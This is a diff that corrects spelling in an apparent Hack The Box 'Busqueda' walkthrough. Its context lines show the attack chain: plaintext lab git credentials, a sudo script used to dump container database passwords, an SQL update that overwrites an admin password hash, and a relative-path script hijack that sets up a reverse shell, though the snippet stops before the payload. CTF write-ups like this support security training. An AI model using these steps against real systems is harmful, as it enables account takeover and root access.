@@ -135,7 +135,7 @@ origin  http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.gi
 origin  http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git (push)
 ```
 
-Here we have gathered many useful informations:
+Here we have gathered many useful information:
 - We have a local git host account (remember the gitea server we enumerated in the beginning?)
 - We have plain text credentials for user *cody* (password: **jh1usoih2bkjaspwe92**)
 
@@ -155,18 +155,18 @@ svc@busqueda:/var/www/app$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py 
 Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)
 
      docker-ps     : List running docker containers
-     docker-inspect : Inpect a certain docker container
+     docker-inspect : Inspect a certain docker container
      full-checkup  : Run a full system checkup
 ```
 
-Here we have a lot more informations gained:
+Here we have a lot more information gained:
 - We can run sudo, but we're just allowed to run a specific python3 script
 - We cannot read the python script
 - The python script suggests that we can run 3 different sub-commands:
     + docker-ps
     + docker-inspect
     + full-checkup
-- From the above list we can tell that there is a docker running on ther server
+- From the above list we can tell that there is a docker running on their server
 
 To dive a bit more deep let's try those commands:
 
@@ -180,7 +180,7 @@ svc@busqueda:/var/www/app$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py 
 Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>
 ```
 
-We're gaining a lot more informations, we have 2 containers running:
+We're gaining a lot more information, we have 2 containers running:
 - The gitea instance (now we know it's dockerized) exposing port 3000 and 22 (over local 222)
 - A MySQL instance exposing port 3306 and 33060
 
@@ -195,7 +195,7 @@ svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-insp
 
 I omitted the output because json is not easy easy too read if not well-formatted, you can find a readable version of the commands output in [gitea-docker-inspect.json](gitea-docker-inspect.json) and in [mysql-docker-inspect.json](mysql-docker-inspect.json). 
 
-Anyhow, let's recap the informations gained from running the above commands:
+Anyhow, let's recap the information gained from running the above commands:
 - The MySQL database is linked with the gitea instance
 - We gained the database name, user and password used by the gitea instance to connect
 - We gained the mysql root password
@@ -272,7 +272,7 @@ mysql> select name,salt,passwd from user;
 2 rows in set (0.00 sec)
 ```
 
-I couldn't quite figure out the hashing algorithm in order to set a custom password for administrator, and I didn't want to look at the gitea sources nor try to crach the hash so i decided to copy the same salt and password from the cody user.
+I couldn't quite figure out the hashing algorithm in order to set a custom password for administrator, and I didn't want to look at the gitea sources nor try to crack the hash so I decided to copy the same salt and password from the cody user.
 
 ```console
 mysql> update user set salt="d1db0a75a18e50de754be2aafcad5533", passwd="b1f895e8efe070e184e5539bc5d93b362b246db67f3a2b6992f37888cb778e844c0017da8fe89dd784be35da9a337609e82e" where name="administrator";
@@ -286,7 +286,7 @@ I copied over the scripts in this repository for the sake of documentation in th
 
 We can see from the [system-checkup.py](./gitea-administrator-scripts/system-checkup.py) that the action full-checkup has a huge problem, which is also the reason we had the *something went wrong* message before. The python script is trying to launch a script called *full-checkup.sh* but instead of running it from the absolute path, is trying to run it from the current path, therefore we can create whatever *full-checkup.sh* file and run an arbitrary script.
 
-For example, let's put a reversh shell command inside a newly created *full-checkup.sh*:
+For example, let's put a reverse shell command inside a newly created *full-checkup.sh*:
 
 ```sh
 #!/bin/bash
